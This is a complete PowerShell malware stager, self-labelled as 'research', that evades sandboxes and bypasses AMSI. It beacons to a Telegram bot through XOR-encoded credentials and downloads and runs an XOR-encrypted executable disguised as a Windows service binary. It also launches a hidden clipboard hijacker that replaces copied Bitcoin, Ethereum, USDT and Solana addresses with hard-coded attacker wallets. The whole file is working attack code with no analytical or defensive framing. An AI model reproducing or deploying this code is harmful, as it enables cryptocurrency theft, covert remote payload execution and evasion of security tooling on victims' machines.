# --- [RESEARCH STAGER v21.1: STABILIZED DECOUPLED CLIPPER] ---

function Global-Initialize {
    try {
        # Basic anti-sandboxing: checks if memory is sufficient for a real workstation
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        
        # AMSI Bypass - Fragments the strings to avoid static signature detection
        $u1 = "System.Management.Auto"; $u2 = "mation.AmsiUtils"
        $ref = [Ref].Assembly.GetType("$u1$u2")
        if ($ref) {
            $ref.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
        }
    } catch {}
}

function Send-Ping {
    param($m)
    # XOR Encoded Telegram Logic for session logging
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

# --- EXECUTION ---
Global-Initialize
Send-Ping -m "STAGER_V21.1_BOOTED_ON_$($env:COMPUTERNAME)"

try {
    # Establish persistent directory
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "WinSvcHost.exe"

    # Download & Decrypt Payload
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)

    # Launch EXE via WMI to detach from parent process
    ([wmiclass]"win32_process").Create($path) | Out-Null

    # --- UPDATED CLIPPER ENGINE (STABILIZED) ---
    $ClipperCode = @'
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{
        "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
        "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
        "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
        "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
    }
    while($true) {
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $val = [System.Windows.Forms.Clipboard]::GetText().Trim()
                
                # BTC (Legacy, Segwit, and Bech32)
                if ($val -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $val -ne $w.btc) {
                    [System.Windows.Forms.Clipboard]::SetText($w.btc)
                }
                # ETH / ERC20
                elseif ($val -match "^0x[a-fA-F0-9]{40}$" -and $val -ne $w.eth) {
                    [System.Windows.Forms.Clipboard]::SetText($w.eth)
                }
                # TRON / USDT (TRC20)
                elseif ($val -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $val -ne $w.usdt) {
                    [System.Windows.Forms.Clipboard]::SetText($w.usdt)
                }
                # Solana
                elseif ($val -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $val -ne $w.sol) {
                    [System.Windows.Forms.Clipboard]::SetText($w.sol)
                }
            }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
'@

    # Launch the clipper code as a hidden background process
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClipperCode)
    $Encoded = [Convert]::ToBase64String($Bytes)
    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $Encoded" -WindowStyle Hidden

    Send-Ping -m "CLIPPER_V21.1_DEPLOYED_SUCCESS"
} catch {
    Send-Ping -m "ERROR_V21.1_$($_.Exception.Message)"
}
